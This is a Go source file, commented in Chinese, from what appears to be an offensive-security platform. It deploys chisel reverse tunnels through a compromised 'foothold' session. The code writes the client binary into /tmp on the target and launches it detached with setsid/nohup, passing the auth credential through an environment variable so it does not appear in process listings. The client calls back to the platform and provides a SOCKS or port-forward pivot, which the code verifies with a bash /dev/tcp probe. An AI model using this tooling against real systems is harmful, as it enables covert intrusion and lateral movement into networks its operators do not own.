// deploy.go 是隧道部署（四件套之 deploy, v0.6.5)：① 平台侧起 chisel server
// （进程台账：pid/日志落 deploy_params)；② 客户端二进制经立足点会话分块写入
// 目标 /tmp 随机目录并 chmod+x；③ 远端后台拉起（输出重定向，pid 经哨兵取回）；
// ④ 隧道内决定性验证——通才标 alive；⑤ 任一失败按 RollbackSteps 逐层回滚，
// 台账行保留（state=error）并记一条 tunnel_deploy_attempts 供重试审计。
//
// 与参考实现（panda0x123/artex-ymh tunnel/deploy.go）的差异：
// - 无 stage 暂存服务：deliver 直接走 session.WriteFile（内部 200KB 分块），
// 慢但不依赖额外服务；
// - DeployExisting 部署已建台账行（tunnel_plan 工具先建行、state=deploying），
// 失败不删行——v0.6.5 要求投递失败留痕、可重试。
package tunnel

import (
	"context"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"time"

	"github.com/Autumn-27/artex/db"
	"github.com/Autumn-27/artex/session"
)

// 部署时序参数。
const (
	serverUpWait   = 2 * time.Second  // server 进程秒退检测
	callbackWait   = 25 * time.Second // 等目标回连（反向监听口起来）
	dialProbeEvery = 500 * time.Millisecond
	verifyTimeout  = 8 * time.Second
	remoteExecWait = 120 * time.Second // 写入二进制（会话分块）
	probeTimeout   = 20 * time.Second  // 单条探针命令的目标侧超时
)

// detailOf 截断命令回显用于错误信息（最多 200 字符）。
func detailOf(out string) string {
	out = strings.TrimSpace(out)
	const max = 200
	if len(out) > max {
		out = out[:max] + "…"
	}
	return out
}

// Manager 是隧道子系统的运行时：部署/验证/回滚/巡检/回收。受管资源原则——
// 所有外部暴露面（server 进程、远端进程、监听端口）都经它登记与回收。
type Manager struct {
	store           *db.TunnelStore
	sessions        *session.Registry
	chiselPath      string // 空 = 二进制缺失，Deploy 返回明确错误
	suo5Path        string // 空 = suo5 二进制缺失，suo5 适配器 Deploy 返回明确错误
	suo5PayloadsDir string // 空 = payloads 目录缺失，同上
	dataDir         string // 平台侧隧道工作目录（authfile/日志）
	// OnListenStart/OnListenStop 是监听端口台账钩子（server 层注册进端口审计）。
	OnListenStart func(port int)
	OnListenStop  func(port int)
	// OnStateChange 是隧道状态变化钩子（server 层挂任务 MITM 上游热切换）。
	// 在 alive/error/stopped 每次落定后触发，参数为归属任务 id。
	OnStateChange func(taskID int64)
	// OnAttempt 是每次投递尝试的记录钩子（server 层写入 tunnel_deploy_attempts）。
	OnAttempt func(tunnelID, sessionID int64, adapter, status, detail string)

	procs map[int64]*exec.Cmd // tunnel_id → 本进程拉起的 server（进程台账内存面）
}

// Options 是 Manager 装配输入。
type Options struct {
	Store      *db.TunnelStore
	Sessions   *session.Registry
	ChiselPath string // ARTEX_CHISEL_PATH 或 data/tools/chisel；不存在时 Deploy 明确报错
	// Suo5Path 是 suo5 CLI 路径（ARTEX_SUO5_PATH 或 data/tools/suo5);
	// Suo5PayloadsDir 是 payload 目录（ARTEX_SUO5_PAYLOADS_DIR 或 data/tools/suo5-payloads)。
	// 缺失时仅 suo5 适配器 Deploy 报明确错误，不影响 chisel。
	Suo5Path        string
	Suo5PayloadsDir string
	DataDir         string
}

// NewManager 构造运行时。chisel 存在时读 sha256 打印日志（供应链自检）。
func NewManager(o Options) (*Manager, error) {
	if o.Store == nil || o.Sessions == nil {
		return nil, fmt.Errorf("tunnel.Manager 需要 store 与 sessions")
	}
	dir := filepath.Join(o.DataDir, "tunnels")
	if err := os.MkdirAll(dir, 0o700); err != nil {
		return nil, err
	}
	m := &Manager{
		store: o.Store, sessions: o.Sessions,
		chiselPath: o.ChiselPath, dataDir: dir,
		suo5Path: o.Suo5Path, suo5PayloadsDir: o.Suo5PayloadsDir,
		procs: map[int64]*exec.Cmd{},
	}
	if o.ChiselPath != "" {
		if sum, err := fileSHA256(o.ChiselPath); err != nil {
			log.Printf("[tunnel] chisel 二进制不可读（%s): %v —— Deploy 将报明确错误", o.ChiselPath, err)
			m.chiselPath = ""
		} else {
			log.Printf("[tunnel] chisel 二进制： %s sha256=%s", o.ChiselPath, sum)
		}
	} else {
		log.Printf("[tunnel] 未配置 chisel 二进制（ARTEX_CHISEL_PATH 或 data/tools/chisel),tunnel_deploy 将报明确错误")
	}
	if m.suo5Path != "" {
		if sum, err := fileSHA256(m.suo5Path); err != nil {
			log.Printf("[tunnel] suo5 二进制不可读（%s): %v —— suo5 适配器 Deploy 将报明确错误", m.suo5Path, err)
			m.suo5Path = ""
		} else {
			log.Printf("[tunnel] suo5 二进制： %s sha256=%s", m.suo5Path, sum)
		}
	} else {
		log.Printf("[tunnel] 未配置 suo5 二进制（ARTEX_SUO5_PATH 或 data/tools/suo5),adapter=suo5 将报明确错误")
	}
	if m.suo5PayloadsDir != "" {
		if st, err := os.Stat(m.suo5PayloadsDir); err != nil || !st.IsDir() {
			log.Printf("[tunnel] suo5 payloads 目录不可读（%s) —— suo5 适配器 Deploy 将报明确错误", m.suo5PayloadsDir)
			m.suo5PayloadsDir = ""
		}
	}
	return m, nil
}

func fileSHA256(path string) (string, error) {
	f, err := os.Open(path)
	if err != nil {
		return "", err
	}
	defer f.Close()
	h := sha256.New()
	if _, err := io.Copy(h, f); err != nil {
		return "", err
	}
	return hex.EncodeToString(h.Sum(nil)), nil
}

// ChiselPath 返回已校验的 chisel 路径（空 = 缺失）。
func (m *Manager) ChiselPath() string { return m.chiselPath }

// Suo5Path 返回已校验的 suo5 CLI 路径（空 = 缺失）。
func (m *Manager) Suo5Path() string { return m.suo5Path }

// CanListen 试绑平台端口（端口分配的真实检查）。
func CanListen(port int) bool {
	ln, err := net.Listen("tcp", "0.0.0.0:"+strconv.Itoa(port))
	if err != nil {
		return false
	}
	_ = ln.Close()
	return true
}

// UsedPorts 汇总活隧道台账占用的平台端口（listen/socks/local)。
func UsedPorts(recs []*db.TunnelRecord) map[int]bool {
	used := map[int]bool{}
	for _, r := range recs {
		if r.ListenPort > 0 {
			used[r.ListenPort] = true
		}
		var p Plan
		if json.Unmarshal(r.DeployParams, &p) == nil {
			if p.SocksPort > 0 {
				used[p.SocksPort] = true
			}
			if p.LocalPort > 0 {
				used[p.LocalPort] = true
			}
		}
	}
	return used
}

func (m *Manager) saveParams(ctx context.Context, id int64, p *Plan) {
	raw, err := json.Marshal(p)
	if err != nil {
		return
	}
	if err := m.store.UpdateDeployParams(ctx, id, p.RemotePID, raw); err != nil {
		log.Printf("[tunnel] 台账参数回写失败(id=%d): %v", id, err)
	}
}

func (m *Manager) attempt(tunnelID, sessionID int64, adapter, status, detail string) {
	if m.OnAttempt != nil {
		m.OnAttempt(tunnelID, sessionID, adapter, status, detail)
	}
}

// notifyState 触发状态变化钩子（server 层据此热切换任务 MITM 上游）。
func (m *Manager) notifyState(taskID int64) {
	if m.OnStateChange != nil && taskID > 0 {
		m.OnStateChange(taskID)
	}
}

// DeployExisting 对已建台账行执行完整部署：起 server → 投递客户端 → 远端拉起 →
// 决定性验证 → 标 alive。任一失败逐层回滚（台账行保留、state=error），并记
// 一条投递尝试；成功也记一条。adapter=suo5 时分流到 deploySuo5Into
// （HTTP 隧道，无目标侧进程，覆盖无出网场景）。
func (m *Manager) DeployExisting(ctx context.Context, rec *db.TunnelRecord, sess session.Session) error {
	var p Plan
	if err := json.Unmarshal(rec.DeployParams, &p); err != nil {
		return fmt.Errorf("台账 deploy_params 解析失败： %w", err)
	}
	if sess == nil {
		err := fmt.Errorf("会话 %d 不可用，无法部署", rec.ViaSessionID)
		m.fail(ctx, rec, &p, err)
		return err
	}
	if p.Adapter == AdapterSuo5 {
		return m.deploySuo5Existing(ctx, rec, sess, &p)
	}
	if m.chiselPath == "" {
		err := fmt.Errorf("chisel 二进制缺失：把对应平台的 chisel 放到 data/tools/chisel 或设 ARTEX_CHISEL_PATH 后重试")
		m.fail(ctx, rec, &p, err)
		return err
	}
	if p.Kind == KindSocks && p.SocksPort <= 0 || p.Kind == KindPortfwd && p.LocalPort <= 0 {
		err := fmt.Errorf("计划缺收入口端口（socks_port/local_port)")
		m.fail(ctx, rec, &p, err)
		return err
	}
	if err := m.deployInto(ctx, rec.ID, sess, &p); err != nil {
		m.rollback(ctx, rec.ID, sess, &p)
		m.fail(ctx, rec, &p, err)
		return err
	}
	if err := m.store.UpdateState(ctx, rec.ID, db.TunnelAlive, ""); err != nil {
		log.Printf("[tunnel] 状态回写失败(id=%d): %v", rec.ID, err)
	}
	m.attempt(rec.ID, rec.ViaSessionID, p.Adapter, "ok", "chisel 部署成功，入口 "+m.entryAddr(&p))
	m.notifyState(p.TaskID)
	return nil
}

// fail 把台账标 error 并记一条失败尝试（留痕、可重试）。
func (m *Manager) fail(ctx context.Context, rec *db.TunnelRecord, p *Plan, err error) {
	if uerr := m.store.UpdateState(ctx, rec.ID, db.TunnelError, err.Error()); uerr != nil {
		log.Printf("[tunnel] 状态回写失败(id=%d): %v", rec.ID, uerr)
	}
	m.attempt(rec.ID, rec.ViaSessionID, p.Adapter, "failed", err.Error())
	m.notifyState(p.TaskID)
}

// deployInto 按层推进，每层成功即把台账参数落库（进程台账逐层补齐）。
func (m *Manager) deployInto(ctx context.Context, id int64, sess session.Session, p *Plan) error {
	// 层 1：平台侧 chisel server(authfile 0600,auth 不进命令行）。
	if err := os.WriteFile(p.AuthFile, []byte(p.AuthfileContent()), 0o600); err != nil {
		return fmt.Errorf("层 server_process: authfile 写入失败: %w", err)
	}
	logFile, err := os.OpenFile(p.ServerLog, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0o600)
	if err != nil {
		return fmt.Errorf("层 server_process: 日志打开失败: %w", err)
	}
	cmd := exec.Command(m.chiselPath, p.ServerArgs...)
	cmd.Stdout, cmd.Stderr = logFile, logFile
	if err := cmd.Start(); err != nil {
		_ = logFile.Close()
		return fmt.Errorf("层 server_process: 启动失败: %w", err)
	}
	p.ServerPID = cmd.Process.Pid
	m.procs[id] = cmd
	m.saveParams(ctx, id, p)
	if m.OnListenStart != nil {
		m.OnListenStart(p.ListenPort)
	}
	go func() { _ = cmd.Wait(); _ = logFile.Close() }()
	time.Sleep(serverUpWait) // 秒退检测
	if cmd.ProcessState != nil && cmd.ProcessState.Exited() {
		return fmt.Errorf("层 server_process: chisel server 秒退（日志 %s)", p.ServerLog)
	}

	// 层 2：客户端二进制经会话分块写入目标。
	if err := m.deliver(ctx, sess, p); err != nil {
		return fmt.Errorf("层 deliver: %w", err)
	}
	m.saveParams(ctx, id, p)

	// 层 3：远端后台拉起（AUTH 走环境变量，不进 ps cmdline;setsid+nohup 脱离会话）。
	pid, err := m.spawnRemote(ctx, sess, p)
	if err != nil {
		return fmt.Errorf("层 remote_process: %w", err)
	}
	p.RemotePID = pid
	m.saveParams(ctx, id, p)

	// 层 4：隧道内决定性验证。反向监听口 accept ≠ 目标可达，必须真实拨测。
	if err := m.verify(ctx, sess, p); err != nil {
		return fmt.Errorf("层 verify: %w", err)
	}
	return nil
}

// deliver 经会话把客户端二进制写到目标 RemoteBin 并 chmod+x。
// （参考实现先走 stage 一次性 URL 下载；本仓库无 stage 服务，直接分块写入。）
func (m *Manager) deliver(ctx context.Context, sess session.Session, p *Plan) error {
	data, err := os.ReadFile(m.chiselPath)
	if err != nil {
		return fmt.Errorf("读取本地 chisel 失败: %w", err)
	}
	if _, _, err := sess.Exec(ctx, "mkdir -p "+p.RemoteDir, probeTimeout); err != nil {
		return fmt.Errorf("远端目录创建失败: %w", err)
	}
	if err := sess.WriteFile(ctx, p.RemoteBin, data); err != nil {
		return fmt.Errorf("会话分块写入失败: %w", err)
	}
	return m.chmodRemote(ctx, sess, p)
}

func (m *Manager) chmodRemote(ctx context.Context, sess session.Session, p *Plan) error {
	stdout, _, err := sess.Exec(ctx, fmt.Sprintf("chmod +x %s && echo ARTEX_CHMOD_OK || echo ARTEX_CHMOD_FAIL", p.RemoteBin), probeTimeout)
	if err != nil {
		return fmt.Errorf("chmod 执行失败: %w", err)
	}
	if !strings.Contains(stdout, "ARTEX_CHMOD_OK") {
		return fmt.Errorf("chmod 失败（目标可能 noexec 挂载 /tmp): %s", detailOf(stdout))
	}
	return nil
}

// spawnRemote 远端后台拉起 client，经哨兵取回真实 pid。
func (m *Manager) spawnRemote(ctx context.Context, sess session.Session, p *Plan) (int, error) {
	// AUTH 经 env 注入（chisel client 在 --auth 缺省时读 AUTH env)——auth 不出现在
	// 目标机 ps cmdline;取舍：/proc/<pid>/environ 对同 uid 仍可见，目标已是立足点，可接受。
	spawn := fmt.Sprintf(`cd %s && setsid env AUTH='%s:%s' nohup./ch %s > %s 2>&1 < /dev/null & echo ARTEX_PID=$!`,
		p.RemoteDir, p.AuthUser, p.AuthPass, strings.Join(p.ClientArgs, " "), p.RemoteLog)
	stdout, _, err := sess.Exec(ctx, spawn, probeTimeout)
	if err != nil {
		return 0, fmt.Errorf("拉起命令失败: %w", err)
	}
	_, after, found := strings.Cut(stdout, "ARTEX_PID=")
	if !found {
		return 0, fmt.Errorf("未取到远端 pid（哨兵缺失）: %s", detailOf(stdout))
	}
	pidStr := strings.Fields(after)
	if len(pidStr) == 0 {
		return 0, fmt.Errorf("远端 pid 解析失败： %s", detailOf(stdout))
	}
	pid, err := strconv.Atoi(strings.TrimSpace(pidStr[0]))
	if err != nil || pid <= 0 {
		return 0, fmt.Errorf("远端 pid 非法 %q", pidStr[0])
	}
	return pid, nil
}

// verify 等回连入口起来后做决定性验证。
func (m *Manager) verify(ctx context.Context, sess session.Session, p *Plan) error {
	entry := m.entryAddr(p)
	// 等反向入口监听起来（= 目标已回连）。
	deadline := time.Now().Add(callbackWait)
	up := false
	for time.Now().Before(deadline) {
		conn, err := net.DialTimeout("tcp", entry, dialProbeEvery)
		if err == nil {
			_ = conn.Close()
			up = true
			break
		}
		select {
		case <-ctx.Done():
			return ctx.Err()
		case <-time.After(dialProbeEvery):
		}
	}
	if !up {
		return fmt.Errorf("等待回连超时（%v 内 %s 未起监听；可能出网被拦/端口白名单，先 tunnel_probe 复核）", callbackWait, entry)
	}
	switch p.Kind {
	case KindSocks:
		// 验证目标按序尝试，任一通过即算隧道通：
		// 1) 显式 verify_addr(默认=立足点 webshell 地址，但经 NAT/端口映射时
		// 该地址对目标侧无意义——实战：host:8082 映射到容器:8080，容器回环无 8082);
		// 2) 隧道自环 callbackHost:listenPort(chisel server 自身，client 已连上
		// 故目标侧必可达）——经 socks 拨回服务端即证明隧道双向承载，无 NAT 假设。
		cands := []string{}
		if p.VerifyAddr != "" {
			cands = append(cands, p.VerifyAddr)
		}
		cands = append(cands, p.PlatformAddr)
		var lastErr error
		for _, addr := range cands {
			if addr == "" {
				continue
			}
			if err := socks5Dial(entry, addr, verifyTimeout); err == nil {
				if addr == p.PlatformAddr {
					log.Printf("[tunnel] socks 经自环 %s 验证通过（隧道双向承载确认）", addr)
				}
				return nil
			} else {
				lastErr = err
			}
		}
		if lastErr != nil {
			return fmt.Errorf("经 socks5 拨测全部候选失败（入口起≠隧道通）: %w", lastErr)
		}
		log.Printf("[tunnel] socks 入口已起，但未给 verify_addr，决定性验证降级为「入口可连」")
		return nil
	case KindPortfwd:
		// 预检：目标侧真实可达 target:port（反向监听对失败拨号也会 accept，不能只信入口）。
		pre := fmt.Sprintf(`bash -c 'timeout 5 bash -c "</dev/tcp/%s/%d"' 2>/dev/null && echo ARTEX_PRE_OK || echo ARTEX_PRE_FAIL`,
			p.TargetHost, p.TargetPort)
		stdout, _, err := sess.Exec(ctx, pre, probeTimeout)
		if err != nil || !strings.Contains(stdout, "ARTEX_PRE_OK") {
			return fmt.Errorf("目标侧预检 %s:%d 不可达（从立足点实测）: %s", p.TargetHost, p.TargetPort, detailOf(stdout))
		}
		conn, err := net.DialTimeout("tcp", entry, verifyTimeout)
		if err != nil {
			return fmt.Errorf("经隧道访问 %s 失败： %w", entry, err)
		}
		_ = conn.SetDeadline(time.Now().Add(3 * time.Second))
		_, _ = conn.Write([]byte("\r\n")) // 轻探：部分服务收到任意字节即回 banner/错误，证明双向通
		_ = conn.Close()
	}
	return nil
}

// entryAddr 是平台回环上的隧道入口（socks5 或转发口）。
func (m *Manager) entryAddr(p *Plan) string {
	port := p.SocksPort
	if p.Kind == KindPortfwd {
		port = p.LocalPort
	}
	return net.JoinHostPort("127.0.0.1", strconv.Itoa(port))
}

// EntryAddr 对外暴露入口地址（工具返回 socks_addr/forward_addr 用）。
func (m *Manager) EntryAddr(p *Plan) string { return m.entryAddr(p) }

// PlanDataDir 是平台侧隧道工作目录（PlanOpts.DataDir 用它）。
func (m *Manager) PlanDataDir() string { return m.dataDir }

// OccupiedPorts 汇总未终结隧道占用的平台端口（端口分配用）。
func (m *Manager) OccupiedPorts(ctx context.Context) (map[int]bool, error) {
	recs, err := m.store.ListActive(ctx)
	if err != nil {
		return nil, err
	}
	return UsedPorts(recs), nil
}

// ActiveRecords 返回全部未终结（deploying|alive|error）台账行。
func (m *Manager) ActiveRecords(ctx context.Context) ([]*db.TunnelRecord, error) {
	return m.store.ListActive(ctx)
}

// TaskRecords 返回某任务的全部台账行。
func (m *Manager) TaskRecords(ctx context.Context, taskID int64) ([]*db.TunnelRecord, error) {
	return m.store.ListByTask(ctx, taskID)
}

// rollback 按 RollbackSteps 逐层回滚（best-effort，每层失败只记日志继续收）。
// 台账行保留（state 由调用方标 error），供重试与审计。
func (m *Manager) rollback(ctx context.Context, id int64, sess session.Session, p *Plan) {
	log.Printf("[tunnel] 部署失败逐层回滚(id=%d)", id)
	if p.RemotePID > 0 {
		m.killRemote(ctx, sess, p)
	}
	if p.RemoteDir != "" {
		_, _, _ = sess.Exec(ctx, "rm -rf "+p.RemoteDir, probeTimeout)
	}
	m.killServer(id, p)
	if p.AuthFile != "" {
		_ = os.Remove(p.AuthFile)
	}
}

// killRemote 经会话杀目标侧进程：先 kill -0 并核对 /proc/<pid>/cmdline 含远端
// 二进制路径——查，且防 pid 复用误杀。
func (m *Manager) killRemote(ctx context.Context, sess session.Session, p *Plan) {
	chk := fmt.Sprintf(`kill -0 %d 2>/dev/null && tr '\0' ' ' < /proc/%d/cmdline 2>/dev/null || echo ARTEX_NO_PROC`, p.RemotePID, p.RemotePID)
	stdout, _, err := sess.Exec(ctx, chk, probeTimeout)
	if err != nil || strings.Contains(stdout, "ARTEX_NO_PROC") {
		return // 远端已不在，无需杀
	}
	if !strings.Contains(stdout, p.RemoteBin) && !strings.Contains(stdout, "/ch ") {
		log.Printf("[tunnel] 远端 pid %d 命令行不含 %s（pid 可能复用），跳过 kill: %s", p.RemotePID, p.RemoteBin, detailOf(stdout))
		return
	}
	_, _, _ = sess.Exec(ctx, fmt.Sprintf("kill %d 2>/dev/null; sleep 1; kill -9 %d 2>/dev/null", p.RemotePID, p.RemotePID), probeTimeout)
}

// killServer 杀平台侧 server 进程（优先本进程台账句柄；否则核对 /proc cmdline 后杀）。
func (m *Manager) killServer(id int64, p *Plan) {
	if cmd, ok := m.procs[id]; ok {
		if cmd.Process != nil {
			_ = cmd.Process.Kill()
		}
		delete(m.procs, id)
	} else if p.ServerPID > 0 && serverCmdlineMatches(p) {
		if proc, err := os.FindProcess(p.ServerPID); err == nil {
			_ = proc.Kill()
		}
	}
	if m.OnListenStop != nil {
		m.OnListenStop(p.ListenPort)
	}
}

// serverCmdlineMatches 核对平台侧 pid 的 /proc cmdline 是否含本隧道 authfile
// （防 pid 复用误杀；读不到时保守返回 false)。
func serverCmdlineMatches(p *Plan) bool {
	if p.AuthFile == "" {
		return false
	}
	b, err := os.ReadFile(fmt.Sprintf("/proc/%d/cmdline", p.ServerPID))
	if err != nil {
		return false
	}
	return strings.Contains(string(b), filepath.Base(p.AuthFile))
}
